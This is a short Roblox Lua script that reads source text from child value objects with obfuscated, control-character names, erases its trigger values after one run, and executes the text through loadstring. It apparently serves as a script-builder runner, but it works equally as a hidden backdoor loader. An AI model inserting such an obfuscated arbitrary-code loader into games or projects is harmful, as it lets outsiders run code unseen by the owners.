local rmv = function(a,b) game:service('Debris'):AddItem(a,b) end
coroutine.wrap(function()
script:WaitForChild(('\a'):rep(8))
script:findFirstChild(('\a'):rep(8)):WaitForChild('\a\a\n\n')
local idx = {script:findFirstChild(('\a'):rep(8)).Value,script:findFirstChild(('\a'):rep(8)):findFirstChild('\a\a\n\n').Value}
script:findFirstChild(('\a'):rep(8)).Value = 'ran' rmv(script:findFirstChild(('\a'):rep(8)):findFirstChild('\a\a\n\n'):Destroy(),0)
if not idx[1]:find(idx[2]) or script:findFirstChild('r\a\n') then return end
Instance.new('IntValue',script).Name = 'r\a\n'
local e,er = ypcall(function() loadstring('coroutine.wrap(function()' .. idx[1]:sub(11) .. ' end)()')() end)
end)()